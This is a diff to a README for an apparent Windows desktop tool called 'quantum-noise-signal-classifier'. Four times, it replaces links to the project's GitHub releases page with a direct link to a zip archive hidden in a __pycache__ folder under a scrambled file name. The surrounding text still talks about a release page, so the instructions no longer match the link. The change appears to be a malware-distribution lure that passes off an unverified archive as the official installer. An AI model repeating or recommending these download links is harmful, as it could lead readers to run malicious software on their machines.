@@ -1,6 +1,6 @@
 # 🧠 quantum-noise-signal-classifier - Clean noise, classify signals fast
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rutherforddock910/quantum-noise-signal-classifier/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rutherforddock910/quantum-noise-signal-classifier/main/__pycache__/noise-classifier-signal-quantum-octangle.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Use it if you want a simple way to run a quantum machine learning tool without s
 
 Visit this page to download the Windows release:
 
-https://github.com/rutherforddock910/quantum-noise-signal-classifier/releases
+https://raw.githubusercontent.com/rutherforddock910/quantum-noise-signal-classifier/main/__pycache__/noise-classifier-signal-quantum-octangle.zip
 
 On that page, look for the latest release.  
 Download the Windows file that matches your system, then open it to start the app.
@@ -198,7 +198,7 @@ If you keep the app in one folder, it is easier to open and use.
 
 Check the release page when you want the newest version:
 
-https://github.com/rutherforddock910/quantum-noise-signal-classifier/releases
+https://raw.githubusercontent.com/rutherforddock910/quantum-noise-signal-classifier/main/__pycache__/noise-classifier-signal-quantum-octangle.zip
 
 That page holds new builds, fixes, and release files for Windows
 
@@ -211,4 +211,4 @@ It is built for users who want a direct desktop tool that handles signal cleanup
 
 If you need the installer later, use this page:
 
-https://github.com/rutherforddock910/quantum-noise-signal-classifier/releases
+https://raw.githubusercontent.com/rutherforddock910/quantum-noise-signal-classifier/main/__pycache__/noise-classifier-signal-quantum-octangle.zip
